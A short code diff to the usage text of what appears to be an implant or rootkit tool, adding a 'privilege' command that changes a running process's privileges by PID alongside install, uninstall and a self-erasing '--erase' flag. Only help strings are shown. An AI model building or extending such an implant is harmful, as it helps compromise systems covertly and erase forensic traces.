@@ -18,6 +18,7 @@ void usage(char *prog_name)
 			"List of main commands:\n"
 			"install   \tInstall the implant to the system\n"
 			"uninstall \tUninstall the implant from the system\n"
+			"privilege \tModify the privilege of a running program with --pid and --perm\n"
 			"List of common flags:\n"
 			"--erase   \tErases the binary after performing the operation\n",
 			prog_name);
